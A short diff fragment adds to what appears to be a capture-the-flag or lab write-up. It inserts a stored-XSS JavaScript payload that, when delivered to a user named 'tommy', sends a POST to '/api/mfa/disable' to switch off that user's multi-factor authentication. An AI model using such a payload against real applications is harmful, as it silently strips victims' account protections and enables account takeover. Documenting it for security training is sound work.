@@ -128,5 +128,14 @@ It takes the session ID
 
 My thinking is i can send a javascript payload to `tommy` to call the API and disable MFA
 
+```javascript
+<script>
+var mfa = new XMLHttpRequest();
+mfa.open('POST', '/api/mfa/disable', false);
+mfa.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
+mfa.send();
+</script>
+```
+
 
 
